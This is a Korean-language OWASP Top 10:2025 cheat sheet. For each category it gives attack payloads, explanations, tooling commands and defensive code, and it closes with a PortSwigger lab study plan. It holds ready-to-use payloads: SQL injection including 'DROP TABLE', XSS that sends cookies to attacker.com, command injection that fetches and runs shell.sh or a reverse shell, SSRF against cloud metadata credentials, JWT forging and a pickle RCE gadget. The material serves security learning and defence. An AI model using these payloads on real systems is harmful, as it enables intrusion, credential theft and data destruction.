# OWASP Top 10:2025 실전 치트시트

> 최종 업데이트: 2026-02-08
> 참고: OWASP Top 10:2025 공식 릴리스 기준

---

## 목차

1. [A01: Broken Access Control](#a01-broken-access-control)
2. [A02: Security Misconfiguration](#a02-security-misconfiguration)
3. [A03: Software Supply Chain Failures](#a03-software-supply-chain-failures)
4. [A04: Cryptographic Failures](#a04-cryptographic-failures)
5. [A05: Injection](#a05-injection)
6. [A06: Insecure Design](#a06-insecure-design)
7. [A07: Authentication Failures](#a07-authentication-failures)
8. [A08: Software or Data Integrity Failures](#a08-software-or-data-integrity-failures)
9. [A09: Security Logging and Alerting Failures](#a09-security-logging-and-alerting-failures)
10. [A10: Mishandling of Exceptional Conditions](#a10-mishandling-of-exceptional-conditions)
11. [PortSwigger 학습 로드맵](#portswigger-학습-로드맵)

---

## A01: Broken Access Control

> 2025에서 SSRF가 이 카테고리에 통합됨. 가장 빈번한 취약점.

### 답지: 실제 페이로드/공격 벡터

#### IDOR (Insecure Direct Object Reference)

```http
# 원래 요청
GET /api/users/1001/profile HTTP/1.1
Authorization: Bearer <my_token>

# 공격: 다른 사용자 ID로 변경
GET /api/users/1002/profile HTTP/1.1
Authorization: Bearer <my_token>

# UUID 기반 IDOR
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# UUID를 수집하거나 예측하여 접근
```

#### 수평/수직 권한 상승

```http
# 일반 사용자가 관리자 기능 접근
GET /admin/dashboard HTTP/1.1
Cookie: session=normal_user_session

# HTTP 메서드 변경으로 우회
POST /api/users/delete HTTP/1.1   # 403 Forbidden
# 우회 시도:
GET /api/users/delete HTTP/1.1    # 200 OK (메서드 검증 누락)
PUT /api/users/delete HTTP/1.1

# 경로 조작으로 우회
GET /admin/dashboard              # 403
GET /Admin/Dashboard              # 200 (대소문자 미구분)
GET /admin/./dashboard            # 200 (경로 정규화 우회)
GET /%61dmin/dashboard            # 200 (URL 인코딩 우회)
GET /admin%00/dashboard           # 200 (Null byte)
```

#### SSRF (Server-Side Request Forgery) - 2025에서 A01에 통합

```http
# 기본 SSRF - 내부 서비스 접근
POST /api/fetch-url HTTP/1.1
Content-Type: application/json

{"url": "http://127.0.0.1:8080/admin"}

# AWS 메타데이터 서비스 접근 (IMDSv1)
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# AWS 대체 표기법 (필터 우회)
{"url": "http://2852039166/latest/user-data"}              # Decimal IP
{"url": "http://0xa9fea9fe/latest/user-data"}              # Hex IP
{"url": "http://169.254.43518/latest/user-data"}            # Octal
{"url": "http://[::ffff:169.254.169.254]/latest/user-data"} # IPv6

# GCP 메타데이터 (헤더 필요)
{"url": "http://metadata.google.internal/computeMetadata/v1/"}
# 헤더: Metadata-Flavor: Google

# Azure 메타데이터
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
# 헤더: Metadata: true

# 내부 네트워크 스캔
{"url": "http://192.168.1.1:22"}    # SSH 포트 확인
{"url": "http://10.0.0.1:3306"}     # MySQL 포트 확인

# DNS Rebinding 공격
{"url": "http://attacker-rebind.example.com"}
# DNS가 처음엔 외부 IP, 두 번째 요청에서 127.0.0.1 반환
```

### 해설: 왜 이 공격이 작동하는가

- **IDOR**: 서버가 "이 사용자가 이 리소스에 접근할 권한이 있는가?"를 검증하지 않음. 인증(authentication)은 하지만 인가(authorization)를 하지 않는 경우
- **수직 권한 상승**: 프론트엔드에서만 메뉴를 숨기고, 백엔드 API에는 권한 검사가 없는 경우
- **SSRF**: 서버가 사용자 입력 URL을 그대로 요청함. 내부 네트워크는 방화벽 뒤에 있지만, 서버 자체는 내부 네트워크에 위치하므로 접근 가능

### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| Burp Suite | 요청 변조 | Proxy > Intercept > Modify Parameter |
| Autorize (Burp 확장) | 자동 권한 테스트 | 두 세션 비교하여 IDOR 자동 탐지 |
| ffuf | 경로 퍼징 | `ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt` |
| SSRFmap | SSRF 자동화 | `python ssrfmap.py -r request.txt -p url -m readfiles` |

### 방어

```python
# IDOR 방어: 리소스 소유자 검증
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    return get_user_profile(user_id)

# SSRF 방어: URL 화이트리스트 + 내부 IP 차단
import ipaddress

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except (socket.gaierror, ValueError):
        return False
    return parsed.scheme in ('http', 'https')
```

### 실습 포인트

- Burp Suite로 모든 API 요청의 ID 파라미터를 변경해보기
- AWS 메타데이터 접근 시 IMDSv2 강제 설정 여부 확인
- 경로 우회 기법을 체계적으로 테스트 (대소문자, 인코딩, 더블인코딩)

---

## A02: Security Misconfiguration

> 2021년 5위에서 2위로 상승. 테스트 앱의 3%에서 발견됨.

### 답지: 실제 페이로드/공격 벡터

```bash
# 디렉토리 리스팅 확인
curl -s http://target.com/.git/config
curl -s http://target.com/.env
curl -s http://target.com/robots.txt
curl -s http://target.com/sitemap.xml
curl -s http://target.com/.DS_Store
curl -s http://target.com/backup.zip

# 기본 자격증명 시도
admin:admin
admin:password
root:root
test:test

# HTTP 헤더 정보 수집
curl -I http://target.com
# Server: Apache/2.4.49  <-- 버전 노출
# X-Powered-By: PHP/7.4  <-- 기술 스택 노출

# CORS 설정 오류 확인
curl -H "Origin: http://evil.com" -I http://target.com/api/data
# Access-Control-Allow-Origin: http://evil.com  <-- 취약!
# Access-Control-Allow-Credentials: true        <-- 더 취약!

# S3 버킷 잘못된 설정
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/secret.txt . --no-sign-request

# 불필요한 HTTP 메서드
curl -X OPTIONS http://target.com/api/ -I
# Allow: GET, POST, PUT, DELETE, TRACE  <-- TRACE 활성화 위험

# 에러 페이지에서 정보 수집
curl http://target.com/nonexistent-page-xyz
# 스택 트레이스, 프레임워크 버전, 파일 경로 노출
```

### 해설: 왜 이 공격이 작동하는가

- 개발 환경 설정이 프로덕션에 그대로 배포됨 (디버그 모드, 상세 에러 메시지)
- 기본 자격증명을 변경하지 않음
- 불필요한 기능(디렉토리 리스팅, TRACE 메서드)을 비활성화하지 않음
- 클라우드 서비스의 기본 권한이 과도하게 열려 있음

### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| Nikto | 웹 서버 스캐닝 | `nikto -h http://target.com` |
| nuclei | 설정 오류 탐지 | `nuclei -u http://target.com -t misconfiguration/` |
| nmap | 서비스/버전 스캐닝 | `nmap -sV -sC target.com` |
| trufflehog | 노출된 비밀 탐지 | `trufflehog git http://target.com/.git` |

### 방어

- 프로덕션에서 디버그 모드 비활성화
- 커스텀 에러 페이지 사용 (스택 트레이스 노출 금지)
- 보안 헤더 설정: `X-Content-Type-Options`, `X-Frame-Options`, `CSP`
- 정기적인 설정 감사 (CIS Benchmarks 활용)
- IaC(Infrastructure as Code)로 설정 표준화

### 실습 포인트

- `nuclei`로 타겟 사이트의 설정 오류를 자동 스캔해보기
- `.git`, `.env`, `backup.zip` 등 민감 파일 경로를 사전 대입해보기

---

## A03: Software Supply Chain Failures

> 2025 신규 카테고리. 기존 "취약하고 오래된 컴포넌트"를 확장.

### 답지: 실제 공격 벡터

```bash
# 알려진 취약 라이브러리 식별
pip audit                              # Python
npm audit                              # Node.js
snyk test                              # 범용

# 의존성 혼동(Dependency Confusion) 공격
# 내부 패키지와 동일한 이름으로 공개 레지스트리에 악성 패키지 등록
# package.json에서 내부 패키지 이름 확인 후:
npm publish malicious-internal-pkg     # 공개 레지스트리에 높은 버전으로 등록

# Typosquatting
pip install reqeusts     # 'requests' 오타 -> 악성 패키지
npm install loadsh       # 'lodash' 오타 -> 악성 패키지

# 빌드 파이프라인 공격
# GitHub Actions의 third-party 액션에 악성 코드 삽입
# CI/CD 환경변수에서 시크릿 탈취
```

### 해설: 왜 이 공격이 작동하는가

- 대부분의 프로젝트가 수백 개의 외부 의존성을 사용
- 패키지 매니저가 기본적으로 공개 레지스트리를 우선 조회
- 개발자가 패키지 이름을 타이핑할 때 오타 발생 가능
- CI/CD 파이프라인이 과도한 권한으로 실행

### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| Snyk | 취약점 스캐닝 | `snyk test --all-projects` |
| OWASP Dependency-Check | 의존성 분석 | `dependency-check --project test --scan ./` |
| Socket.dev | 공급망 공격 탐지 | GitHub 앱으로 PR 자동 검사 |
| Sigstore/cosign | 서명 검증 | `cosign verify --key cosign.pub image:tag` |

### 방어

- 의존성 잠금 파일(lock file) 커밋 필수
- 프라이빗 레지스트리에서 내부 패키지 우선 조회 설정
- Dependabot/Renovate로 자동 업데이트
- SBOM(Software Bill of Materials) 생성 및 관리

---

## A04: Cryptographic Failures

> 2021년 2위에서 4위로 하락했지만 여전히 중요.

### 답지: 실제 페이로드/공격 벡터

```bash
# SSL/TLS 취약점 스캐닝
testssl.sh https://target.com
sslyze --regular target.com:443

# 약한 암호화 확인
nmap --script ssl-enum-ciphers -p 443 target.com
# RC4, DES, 3DES, MD5 사용 여부 확인

# 패딩 오라클 공격
# CBC 모드 + 패딩 검증 에러 메시지 노출 시
padbuster http://target.com/decrypt?data=ENCRYPTED_DATA ENCRYPTED_DATA 8

# JWT 공격
# 알고리즘 None 공격
# 헤더: {"alg":"none","typ":"JWT"}
# 서명 부분을 빈 문자열로 설정
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"

# JWT Secret 브루트포스
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt

# HTTPS -> HTTP 다운그레이드
# HSTS 헤더 없는 경우, 중간자 공격으로 HTTPS를 HTTP로 다운그레이드
sslstrip -l 8080
```

### 해설: 왜 이 공격이 작동하는가

- 오래된 프로토콜/암호화 알고리즘 사용 (SSL 3.0, TLS 1.0, MD5, SHA1)
- 하드코딩된 약한 시크릿 키 (JWT `secret`, `password123`)
- 암호화와 해싱의 혼동 (비밀번호를 Base64로 "암호화")
- HTTPS 강제 미적용

### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| testssl.sh | TLS 설정 감사 | `testssl.sh https://target.com` |
| jwt_tool | JWT 취약점 테스트 | `python3 jwt_tool.py <JWT> -C -d wordlist.txt` |
| hashcat | 해시 크래킹 | `hashcat -m 0 hashes.txt rockyou.txt` |
| CyberChef | 인코딩/디코딩 | 웹 기반 도구 |

### 방어

- TLS 1.2+ 강제, HSTS 헤더 설정
- 비밀번호: bcrypt/argon2 사용 (최소 cost factor 12)
- JWT: RS256 사용, 강력한 시크릿, 만료시간 설정
- 전송 중 + 저장 시 모두 암호화

---

## A05: Injection

> **핵심 카테고리** - SQL Injection, XSS, Command Injection, LDAP Injection 포함.

### SQL Injection

#### 답지: 실제 페이로드

```sql
-- 인증 우회
' OR 1=1 --
' OR '1'='1
admin' --
admin'/*
' OR 1=1#
' OR 1=1/*

-- UNION 기반 (컬럼 수 확인)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- 에러 발생 시 컬럼 수 = 2

-- UNION 기반 (데이터 추출)
' UNION SELECT NULL,NULL--                           -- 컬럼 수 확인
' UNION SELECT 'a',NULL--                            -- 문자열 컬럼 확인
' UNION SELECT username,password FROM users--        -- 데이터 추출
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Boolean Blind SQLi
' AND 1=1--          -- 정상 응답
' AND 1=2--          -- 비정상 응답 (차이 확인)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- Time-Based Blind SQLi (완전 블라인드일 때만 사용)
-- MySQL:
' AND SLEEP(5)--
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--

-- PostgreSQL:
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL:
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--

-- Error-Based (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--

-- Stacked Queries (가능한 경우)
'; DROP TABLE users;--
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--

-- 필터 우회
' UNION/**/SELECT/**/username,password/**/FROM/**/users--  -- 공백 우회
' UnIoN SeLeCt username,password FrOm users--              -- 대소문자 혼합
' /*!UNION*/ /*!SELECT*/ username,password FROM users--    -- MySQL 주석 구문
```

#### 해설: 왜 SQL Injection이 작동하는가

```python
# 취약한 코드 (문자열 연결)
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
# username에 ' OR 1=1-- 입력 시:
# SELECT * FROM users WHERE username='' OR 1=1--' AND password=''
# OR 1=1이 항상 참이므로 모든 사용자 반환

# 안전한 코드 (파라미터화된 쿼리)
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))
```

핵심: 사용자 입력이 SQL 구문의 **구조를 변경**할 수 있기 때문. 파라미터화된 쿼리는 입력을 항상 **데이터**로 처리.

#### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| sqlmap | 자동 SQLi 공격 | `sqlmap -u "http://target.com/page?id=1" --dbs` |
| sqlmap (POST) | POST 요청 | `sqlmap -r request.txt --dbs --batch` |
| sqlmap (Dump) | 데이터 추출 | `sqlmap -u "URL" -D dbname -T users --dump` |
| Burp Repeater | 수동 테스트 | 파라미터에 페이로드 삽입 후 응답 비교 |

### XSS (Cross-Site Scripting)

#### 답지: 실제 페이로드

```html
<!-- 기본 Reflected XSS -->
<script>alert(document.cookie)</script>
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

<!-- 태그/이벤트 기반 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- WAF 우회 페이로드 -->
<svg/onload=alert(1)>                           <!-- 슬래시로 공백 우회 -->
<img src=x onerror="&#97;lert(1)">              <!-- HTML 엔티티 인코딩 -->
<script>eval(atob('YWxlcnQoMSk='))</script>     <!-- Base64 인코딩 -->
<img src=x onerror=alert`1`>                     <!-- 백틱 사용 -->
<script>window['al'+'ert'](1)</script>           <!-- 문자열 연결 -->
<script>self['\x61lert'](1)</script>             <!-- 유니코드 이스케이프 -->

<!-- Stored XSS (게시판, 프로필 등) -->
<script>
  new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- DOM-Based XSS -->
<!-- URL: http://target.com/page#<script>alert(1)</script> -->
<!-- 취약 코드: document.write(location.hash.substring(1)) -->

<!-- CSP 우회 (가능한 경우) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- 쿠키 탈취 전체 페이로드 -->
<script>
  var img = new Image();
  img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie)
    + "&url=" + encodeURIComponent(window.location.href);
</script>
```

#### 해설: 왜 XSS가 작동하는가

```html
<!-- 취약한 서버 코드 -->
<p>검색 결과: <?= $_GET['query'] ?></p>
<!-- query=<script>alert(1)</script> 입력 시 -->
<p>검색 결과: <script>alert(1)</script></p>
<!-- 브라우저가 이것을 유효한 JavaScript로 실행 -->
```

핵심: 서버가 사용자 입력을 HTML 응답에 **이스케이프 없이** 포함하면, 브라우저는 공격자의 입력을 **코드로 실행**. DOM-Based XSS는 서버를 거치지 않고 브라우저 내에서 발생하므로 WAF로 차단 불가.

#### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| XSS Hunter | Blind XSS 탐지 | 자동 콜백 페이로드 생성 |
| Dalfox | 자동 XSS 스캐닝 | `dalfox url "http://target.com/search?q=test"` |
| Burp Repeater | 수동 테스트 | 다양한 페이로드 삽입 및 응답 확인 |
| PortSwigger XSS Cheat Sheet | 벡터 참고 | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |

### Command Injection

#### 답지: 실제 페이로드

```bash
# 기본 커맨드 인젝션
; ls -la
| ls -la
|| ls -la
& ls -la
&& ls -la
`ls -la`
$(ls -la)

# 실전 페이로드
; cat /etc/passwd
| curl http://attacker.com/shell.sh | bash
; wget http://attacker.com/revshell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell

# 필터 우회
;c${IFS}at${IFS}/etc/passwd      # ${IFS}로 공백 우회
;cat$IFS/etc/passwd              # $IFS는 Internal Field Separator
;{cat,/etc/passwd}               # 쉼표로 공백 우회
;cat</etc/passwd                 # 리다이렉션으로 공백 우회

# Blind Command Injection (응답에 출력이 없을 때)
; sleep 5                         # Time-based 확인
; ping -c 5 attacker.com          # OOB DNS
; curl http://attacker.com/$(whoami)  # OOB HTTP
; nslookup $(whoami).attacker.com     # OOB DNS
```

#### 해설: 왜 Command Injection이 작동하는가

```python
# 취약한 코드
import os
os.system("ping -c 1 " + user_input)  # user_input = "8.8.8.8; cat /etc/passwd"
# 실행: ping -c 1 8.8.8.8; cat /etc/passwd

# 안전한 코드
import subprocess
subprocess.run(["ping", "-c", "1", user_input], capture_output=True)
# 입력이 단일 인자로 전달되어 쉘 해석 없음
```

### 방어 (Injection 공통)

```python
# 1. 파라미터화된 쿼리 (SQLi)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 2. 출력 인코딩 (XSS)
from markupsafe import escape
return f"<p>{escape(user_input)}</p>"

# 3. 쉘 명령 회피 (Command Injection)
import subprocess
subprocess.run(["ping", "-c", "1", sanitized_input])

# 4. 입력 검증 (공통)
import re
if not re.match(r'^[a-zA-Z0-9]+$', user_input):
    raise ValueError("Invalid input")
```

### 실습 포인트

- SQLi: sqlmap의 `--level`과 `--risk` 옵션을 변경하며 결과 비교
- XSS: Reflected -> Stored -> DOM 순서로 난이도 상승
- Command Injection: Blind 기법은 시간 차이를 관찰하는 연습 필요

---

## A06: Insecure Design

> 구현 결함이 아닌 **설계 결함**. 코드를 완벽하게 작성해도 설계가 취약하면 공격 가능.

### 답지: 실제 공격 벡터

```
# 비즈니스 로직 취약점 예시

1. 가격 조작
   POST /api/order
   {"item": "premium_plan", "price": 0.01}  # 클라이언트에서 가격 전송

2. 쿠폰 무한 사용
   POST /api/apply-coupon
   {"code": "DISCOUNT50"}  # 횟수 제한 없음

3. 레이스 컨디션
   # 동시에 여러 요청 전송하여 잔액 이상 인출
   for i in range(100):
       threading.Thread(target=withdraw, args=(100,)).start()

4. 비밀번호 복구 흐름 우회
   # Step 1: 이메일 입력 -> Step 2: OTP 입력 -> Step 3: 새 비밀번호
   # Step 2를 건너뛰고 Step 3로 직접 요청
   POST /api/reset-password/step3
   {"email": "victim@target.com", "new_password": "hacked123"}
```

### 해설: 왜 이 공격이 작동하는가

- "이 값은 프론트엔드에서만 설정되니까 안전하다"는 잘못된 가정
- 동시성(concurrency) 제어가 없음
- 멀티스텝 프로세스에서 각 단계의 독립적 검증 부재
- 위협 모델링(Threat Modeling)을 하지 않음

### 방어

- 개발 전 위협 모델링 (STRIDE, PASTA)
- 서버 측에서 모든 비즈니스 로직 검증
- Rate limiting + 동시성 제어 (분산 락, 트랜잭션)
- 보안 사용 사례(abuse case)를 요구사항에 포함

---

## A07: Authentication Failures

> 인증 메커니즘의 취약점. 자격증명 스터핑, 세션 관리 결함 포함.

### 답지: 실제 페이로드/공격 벡터

```bash
# 브루트포스 공격
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# Credential Stuffing (유출된 자격증명 사용)
# 유출 DB에서 email:password 쌍을 수집하여 대량 로그인 시도

# 세션 고정(Session Fixation)
# 공격자가 알고 있는 세션 ID를 피해자에게 강제
http://target.com/login?JSESSIONID=attacker_known_session

# 세션 하이재킹
# XSS로 쿠키 탈취 후 해당 세션으로 접근
Cookie: session=stolen_session_value

# JWT 공격
# 알고리즘 변경: RS256 -> HS256 (공개키를 시크릿으로 사용)
# 만료시간 제거: "exp" 클레임 삭제

# 2FA 우회
# 2FA 코드 브루트포스 (4-6자리 = 10000-999999 시도)
# 응답 조작: {"success": false} -> {"success": true}
# 백업 코드 브루트포스
# 2FA 검증 단계를 건너뛰고 인증 후 페이지로 직접 접근

# 비밀번호 복구 토큰 예측
# 시간 기반 토큰: MD5(email + timestamp)
# 순차 토큰: reset_token=12345 -> 12346
```

### 해설: 왜 이 공격이 작동하는가

- Rate limiting 미적용: 무한 로그인 시도 가능
- 약한 세션 토큰: 예측 가능하거나 충분히 랜덤하지 않음
- 인증 후 세션 ID 미갱신: 세션 고정 공격에 취약
- 비밀번호 정책 미흡: 사전 공격에 취약한 패스워드 허용

### 도구

| 도구 | 용도 | 명령어 |
|------|------|--------|
| Hydra | 브루트포스 | `hydra -l admin -P wordlist.txt ssh://target` |
| Burp Intruder | 자동화 공격 | Payload positions 설정 후 공격 실행 |
| jwt_tool | JWT 테스트 | `jwt_tool.py TOKEN -C -d secrets.txt` |
| CeWL | 커스텀 사전 생성 | `cewl http://target.com -w custom_wordlist.txt` |

### 방어

- 계정 잠금 / Rate limiting / CAPTCHA
- 강력한 비밀번호 정책 + 유출 비밀번호 DB 조회 (Have I Been Pwned)
- 로그인 후 세션 ID 재발급
- 하드웨어 기반 MFA (FIDO2/WebAuthn)
- JWT: RS256 사용, 짧은 만료시간, 블랙리스트 관리

---

## A08: Software or Data Integrity Failures

### 답지: 실제 공격 벡터

```bash
# 안전하지 않은 역직렬화
# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'calc.exe' | base64

# Python (pickle)
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())

# PHP (unserialize)
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}

# CI/CD 파이프라인 조작
# GitHub Actions workflow 파일 수정으로 빌드 시 악성 코드 실행
# 서명되지 않은 업데이트 메커니즘 악용
```

### 해설: 왜 이 공격이 작동하는가

- 역직렬화는 데이터를 **객체로 복원**하는 과정에서 임의 코드 실행 가능
- 코드 서명 검증 없이 업데이트를 신뢰
- CI/CD 파이프라인에 대한 접근 제어 부족

### 방어

- 역직렬화 입력을 신뢰하지 않기 (JSON 등 안전한 포맷 사용)
- 코드 서명 및 무결성 검증 (Sigstore, GPG)
- CI/CD 파이프라인 보안 강화 (최소 권한, 감사 로그)

---

## A09: Security Logging and Alerting Failures

### 답지: 확인 포인트

```
# 로깅 부재 확인
1. 로그인 실패 기록 여부
2. 권한 변경 기록 여부
3. 입력 유효성 검사 실패 기록 여부
4. 관리자 활동 기록 여부

# 로그 인젝션
username: admin\n[2025-01-01] Login successful for admin
# 로그 파일에 가짜 엔트리 삽입

# 로그 포맷 문자열 공격
username: %s%s%s%s%s  # 서버 측 포맷 문자열 취약점
```

### 해설: 왜 이것이 문제인가

- 공격이 발생해도 탐지할 수 없음
- 사후 분석(포렌식)이 불가능
- 규정 준수(GDPR, PCI DSS) 요구사항 위반

### 방어

- 중앙 집중식 로그 관리 (ELK, Splunk)
- 비정상 패턴 알림 (다수의 로그인 실패, 비정상 접근 시간)
- 로그 무결성 보장 (append-only, 별도 서버)
- 로그에 민감 정보 포함 금지

---

## A10: Mishandling of Exceptional Conditions

> 2025 신규 카테고리.

### 답지: 실제 공격 벡터

```bash
# 에러 메시지를 통한 정보 수집
curl http://target.com/api/user?id=99999999
# 500 Internal Server Error
# {"error": "MySQLSyntaxErrorException: Unknown column...", "stack": "..."}

# 대용량 입력으로 서비스 장애 유발
curl -X POST http://target.com/api/upload \
  -H "Content-Type: application/json" \
  -d '{"data": "'$(python3 -c "print('A'*10000000)")'"}'

# 예외 상태를 이용한 인증 우회
# 잘못된 형식의 토큰 전송 시 에러 처리 과정에서 인증 건너뜀
Authorization: Bearer INVALID_BUT_LONG_TOKEN_THAT_CAUSES_PARSING_ERROR

# 동시성 에러 유발
# 레이스 컨디션으로 불일치 상태 생성
```

### 해설: 왜 이 공격이 작동하는가

- 에러 핸들링이 catch-all로 모든 예외를 무시 (`except: pass`)
- 에러 발생 시 기본 "허용" 모드로 폴백
- 상세한 에러 메시지가 내부 구조를 노출
- 리소스 제한 없이 대용량 입력 수용

### 방어

```python
# 나쁜 예
try:
    user = authenticate(token)
except:
    pass  # 에러 발생 시 인증을 건너뜀!

# 좋은 예
try:
    user = authenticate(token)
except AuthenticationError as e:
    logger.warning(f"Auth failed: {e}")
    return Response(status=401)
except Exception as e:
    logger.error(f"Unexpected error: {e}")
    return Response(status=500)  # Fail-closed
```

- Fail-closed 원칙: 에러 발생 시 기본적으로 **거부**
- 커스텀 에러 페이지 (내부 정보 노출 방지)
- 입력 크기/속도 제한
- 구체적인 예외 처리 (catch-all 지양)

---

## PortSwigger 학습 로드맵

> PortSwigger Web Security Academy (https://portswigger.net/web-security) 기반 추천 학습 순서

### Phase 1: 기초 (Apprentice Level)

```
주차 1-2: Server-Side 기초
├── Lab: SQL Injection
│   ├── [Apprentice] SQL injection vulnerability in WHERE clause
│   ├── [Apprentice] SQL injection UNION attack (컬럼 수 확인)
│   ├── [Apprentice] SQL injection UNION attack (문자열 데이터 추출)
│   └── [Practitioner] Blind SQL injection with conditional responses
├── Lab: Authentication
│   ├── [Apprentice] Username enumeration via different responses
│   ├── [Apprentice] 2FA simple bypass
│   └── [Practitioner] Brute-forcing a stay-logged-in cookie
└── Lab: Path Traversal
    ├── [Apprentice] File path traversal, simple case
    └── [Practitioner] File path traversal, validation bypass

주차 3-4: Client-Side 기초
├── Lab: Cross-Site Scripting (XSS)
│   ├── [Apprentice] Reflected XSS into HTML context
│   ├── [Apprentice] Stored XSS into HTML context
│   ├── [Practitioner] DOM XSS in document.write sink
│   └── [Practitioner] Reflected XSS with event handlers blocked
├── Lab: CSRF
│   ├── [Apprentice] CSRF vulnerability with no defenses
│   └── [Practitioner] CSRF where token validation depends on request method
└── Lab: Clickjacking
    └── [Apprentice] Basic clickjacking with CSRF token
```

### Phase 2: 중급 (Practitioner Level)

```
주차 5-6: Server-Side 심화
├── Lab: SSRF
│   ├── [Apprentice] Basic SSRF against local server
│   ├── [Practitioner] SSRF with blacklist-based filter bypass
│   └── [Practitioner] Blind SSRF with out-of-band detection
├── Lab: OS Command Injection
│   ├── [Apprentice] OS command injection, simple case
│   └── [Practitioner] Blind OS command injection with time delays
├── Lab: Business Logic
│   ├── [Apprentice] Excessive trust in client-side controls
│   └── [Practitioner] Low-level logic flaw
└── Lab: Access Control
    ├── [Apprentice] Unprotected admin functionality
    ├── [Practitioner] User role controlled by request parameter
    └── [Practitioner] Insecure direct object references (IDOR)

주차 7-8: 고급 주입
├── Lab: XXE Injection
│   ├── [Apprentice] Exploiting XXE to retrieve files
│   └── [Practitioner] Blind XXE with out-of-band interaction
├── Lab: SSTI (Server-Side Template Injection)
│   ├── [Practitioner] Basic SSTI
│   └── [Practitioner] SSTI in sandboxed environment
└── Lab: Insecure Deserialization
    ├── [Apprentice] Modifying serialized objects
    └── [Practitioner] Exploiting PHP deserialization
```

### Phase 3: 고급 (Expert Level)

```
주차 9-10: 고급 공격
├── Lab: HTTP Request Smuggling
│   ├── [Practitioner] CL.TE request smuggling
│   └── [Expert] HTTP/2 request smuggling
├── Lab: Web Cache Poisoning
│   ├── [Practitioner] Web cache poisoning with unkeyed header
│   └── [Expert] Cache poisoning via ambiguous requests
├── Lab: JWT Attacks
│   ├── [Practitioner] JWT authentication bypass via flawed signature verification
│   └── [Expert] JWT authentication bypass via algorithm confusion
└── Lab: Prototype Pollution
    ├── [Practitioner] DOM XSS via client-side prototype pollution
    └── [Expert] Exfiltrating sensitive data via server-side prototype pollution

주차 11-12: 최신 공격 기법
├── Lab: Race Conditions
│   ├── [Practitioner] Limit overrun race conditions
│   └── [Expert] Multi-endpoint race conditions
├── Lab: GraphQL API Vulnerabilities
│   ├── [Practitioner] Accessing private GraphQL posts
│   └── [Practitioner] Bypassing GraphQL brute force protections
└── Lab: WebSockets
    ├── [Practitioner] Manipulating WebSocket messages
    └── [Practitioner] Cross-site WebSocket hijacking
```

### 학습 팁

1. **각 Lab은 반드시 직접 풀어볼 것** - 풀이를 보기 전 최소 30분 시도
2. **Burp Suite Community Edition** 무료 버전으로 충분히 학습 가능
3. **풀이 후 반드시 "왜 이 공격이 작동했는가"를 정리**
4. **취약 코드 vs 안전한 코드를 함께 이해**
5. **Lab을 풀 때마다 자신만의 페이로드 모음집 업데이트**

---

## 참고 자료

- [OWASP Top 10:2025 공식](https://owasp.org/Top10/2025/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger XSS Cheat Sheet (2026 Edition)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings (GitHub)](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
